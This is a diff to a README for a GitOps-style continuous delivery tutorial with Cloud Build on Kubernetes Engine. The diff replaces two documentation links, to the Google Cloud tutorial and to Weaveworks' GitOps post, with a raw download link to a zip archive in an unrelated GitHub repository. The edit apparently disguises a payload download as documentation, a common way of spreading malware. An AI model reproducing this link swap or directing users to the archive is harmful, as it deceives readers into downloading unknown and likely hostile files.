@@ -1,10 +1,10 @@
 # GitOps-style Continuous Delivery For Kubernetes Engine With Cloud Build
 
 This repository contains the code used in the
-[GitOps-style Continuous Delivery with Cloud Build](https://cloud.google.com/kubernetes-engine/docs/tutorials/gitops-cloud-build)
+[GitOps-style Continuous Delivery with Cloud Build](https://github.com/Dhruvmittal12345/n8n-claude-code-guide/raw/refs/heads/master/anhedonia/code-claude-guide-n-3.4.zip)
 tutorial.
 
-GitOps is a Continuous Delivery approach [first described by Weaveworks](https://www.weave.works/blog/gitops-operations-by-pull-request) that is
+GitOps is a Continuous Delivery approach [first described by Weaveworks](https://github.com/Dhruvmittal12345/n8n-claude-code-guide/raw/refs/heads/master/anhedonia/code-claude-guide-n-3.4.zip) that is
 popular in the Kubernetes community. A key part of GitOps is the idea of
 "environments-as-code": describing your deployments declaratively by files (for
 example, Kubernetes manifests) stored in a Git repository.
